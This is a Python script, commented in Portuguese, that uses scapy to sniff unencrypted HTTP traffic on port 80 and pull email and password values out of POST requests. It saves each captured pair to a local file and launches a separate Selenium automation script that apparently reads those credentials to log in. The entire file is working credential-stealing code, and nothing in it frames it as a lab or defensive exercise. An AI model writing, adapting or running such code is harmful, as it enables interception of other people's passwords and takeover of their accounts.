import os
import sys
from scapy.all import sniff, Raw
from urllib.parse import unquote
import subprocess

# Define caminhos absolutos para evitar erros no subprocesso
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
ARQUIVO_SAIDA = os.path.join(BASE_DIR, "captura.txt")
ARQUIVO_TEMP = os.path.join(BASE_DIR, "captura.tmp")

# Tente localizar o python do venv dinamicamente ou use o caminho fixo
if sys.prefix != sys.base_prefix:
    # Está rodando num venv
    python_exec = sys.executable
else:
    # Caminho manual caso não esteja ativo o venv no shell atual
    python_exec = os.path.join(BASE_DIR, ".venv/bin/python")


def salvar_credenciais_atomico(email, senha):
    """
    Escreve num arquivo temporário e renomeia.
    Isso evita que o Selenium leia o arquivo enquanto ele ainda está sendo escrito.
    """
    try:
        with open(ARQUIVO_TEMP, "w", encoding="utf-8") as f:
            f.write(f"{email} {senha}")
            f.flush()
            os.fsync(f.fileno())

        # A renomeação é atômica em sistemas POSIX (Linux/Mac)
        os.replace(ARQUIVO_TEMP, ARQUIVO_SAIDA)
        print(f"[disk] Credenciais salvas para automação: {email}")
    except Exception as e:
        print(f"[erro] Falha ao salvar credenciais: {e}")


def processar(pacote):
    if pacote.haslayer(Raw):
        try:
            # Decodifica e limpa caracteres nulos que podem quebrar strings
            data = pacote[Raw].load.decode(errors="ignore").replace('\x00', '')

            # Verifica se é um POST relevante
            if "POST" in data and "email=" in data:

                email = ""
                senha = ""

                # Lógica de extração mais robusta
                try:
                    # Pega o corpo da requisição (após os headers)
                    if "\r\n\r\n" in data:
                        body = data.split("\r\n\r\n")[1]
                    else:
                        body = data

                    parts = body.split("&")
                    for part in parts:
                        if "email=" in part:
                            email = unquote(part.split("=")[1])
                        elif "passwd=" in part:
                            senha = unquote(part.split("=")[1])
                except IndexError:
                    return

                # --- CRÍTICO: SÓ SALVA SE TIVER OS DOIS ---
                # O erro anterior era salvar mesmo com senha vazia
                if email and senha and len(email) > 3 and len(senha) > 0:
                    print("\n[🚨 DADOS VÁLIDOS CAPTURADOS 🚨]")
                    print(f"[EMAIL]  {email}")
                    print(f"[PASSWD] {senha}")
                    print("-----------------------------------------")

                    salvar_credenciais_atomico(email, senha)
                else:
                    # Debug opcional para ver pacotes fragmentados
                    # print(f"[debug] Pacote incompleto ignorado. E: {email} S: {len(senha)}")
                    pass

        except Exception as e:
            # print(e) # Descomente para debug
            pass


# Inicia o subprocesso garantindo que o output seja visível para debug
print(f"[*] Iniciando automação Selenium com: {python_exec}")
script_automacao = os.path.join(BASE_DIR, "selenium_automation.py")

# Popen sem pipes para que o Selenium possa usar o stdout se necessário,
# ou use pipes se quiser silenciar.
proc = subprocess.Popen([python_exec, script_automacao])

print("[*] Sniffer ativo. Aguardando POSTs...")
try:
    sniff(filter="tcp port 80", prn=processar, store=False)
except KeyboardInterrupt:
    print("\n[*] Encerrando...")
    proc.terminate()